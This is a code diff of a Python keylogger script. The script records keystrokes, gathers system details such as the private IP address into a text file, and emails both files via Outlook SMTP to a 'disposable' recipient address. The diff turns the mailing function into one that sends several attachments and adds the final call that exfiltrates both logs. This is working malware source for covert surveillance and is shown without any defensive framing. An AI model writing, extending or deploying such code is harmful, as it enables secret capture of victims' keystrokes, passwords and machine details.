@@ -41,12 +41,12 @@ system_information = "systeminfo.txt"
 
 
 #mailing
-email_address = " "  #desposible email add
-password = " " #its password
-toaddr = " " #desposible email to which we will send our file
+email_address = ""  #desposible email add
+password = "" #its password
+toaddr = "" #desposible email to which we will send our file
 
 #file path
-file_path= " "#put path here where you want to create the file with adding \\
+file_path= ""#put path here where you want to create the file with adding \\
 extend = "\\"
 
 
@@ -87,7 +87,7 @@ with Listener(on_press=on_press, on_release=on_release) as listner:
 
 #mailing service 
 
-def send_email(filename, attachment, toaddr):
+def send_email(filenames, attachments, toaddr):
 
     fromaddr = email_address
     
@@ -101,19 +101,16 @@ def send_email(filename, attachment, toaddr):
 
     msg.attach(MIMEText(body,'plain'))
 
-    filename = filename
-    attachment = open (attachment, 'rb') #rb- 'rb' mode ensures that the file is read in binary mode, 
-                                         #preserving the binary content without any automatic decoding or newline character conversion.
+    for filename, attachment in zip(filenames, attachments):
 
-    p= MIMEBase('application', 'octet-stream')
+        p= MIMEBase('application', 'octet-stream')
+        p.set_payload(open(attachment, 'rb').read())#rb- 'rb' mode ensures that the file is read in binary mode, 
+                                                    #preserving the binary content without any automatic decoding or newline character conversion.
 
-    p.set_payload((attachment).read())
-    encoders.encode_base64(p) #This encoding is necessary when dealing with binary data in email attachments,
+        encoders.encode_base64(p) #This encoding is necessary when dealing with binary data in email attachments,
                               #as email systems generally expect textual data
-
-    p.add_header('content-Disposition',"attachment; filename= %s" %filename)
-
-    msg.attach(p)
+        p.add_header('content-Disposition',f"attachment; filename= {filename}")
+        msg.attach(p)
 
     s=smtplib.SMTP('smtp-mail.outlook.com',587) #smtp server and port of the service  that you are using 
 
@@ -122,9 +119,6 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string() # Converts the entire email message into a string format.
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-
-send_email(keys_information,file_path +extend + keys_information,toaddr)
-
 
 
 #system_information
@@ -149,3 +143,8 @@ def computer_information():
         f.write("Private IP Addess:" + IPAdder + "\n")
 
 computer_information()
+
+
+filenames =[keys_information,system_information]
+attachments = [file_path+extend+keys_information , file_path+extend+system_information]
+send_email(filenames,attachments,toaddr)
